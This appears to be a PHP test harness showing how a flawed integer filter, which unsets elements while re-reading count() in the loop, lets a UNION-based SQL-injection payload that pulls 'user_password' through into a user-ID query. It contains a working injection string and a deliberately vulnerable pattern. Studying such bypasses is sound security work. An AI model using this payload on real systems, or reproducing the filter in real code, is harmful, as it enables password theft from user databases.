<?php
$ids = "0,0,1) UNION SELECT 0,0,user_password FROM users WHERE user_id=0--";
echo "Length: " . strlen($ids) . "\n";
echo "Input: $ids\n\n";

$tmp = explode(',', $ids);
echo "After explode:\n"; print_r($tmp);
echo "count=" . count($tmp) . "\n\n";

for ($i = 0; $i < count($tmp); $i++) {
    echo "i=$i, count=" . count($tmp) . ", tmp[$i]='" . $tmp[$i] . "' => ";
    $tmp[$i] = (int)$tmp[$i];
    echo "(int)=" . $tmp[$i];
    if($tmp[$i] < 1) {
        echo " => UNSET\n";
        unset($tmp[$i]);
    } else {
        echo " => KEEP\n";
    }
}

echo "\nAfter filter:\n"; print_r($tmp);
$selector = implode(',', array_unique($tmp));
echo "\nFinal selector: '$selector'\n";

$query = "SELECT user_id, user_privileges, user_name FROM users WHERE (user_id in (" . $selector . "));";
echo "\nFinal query:\n$query\n";
?>
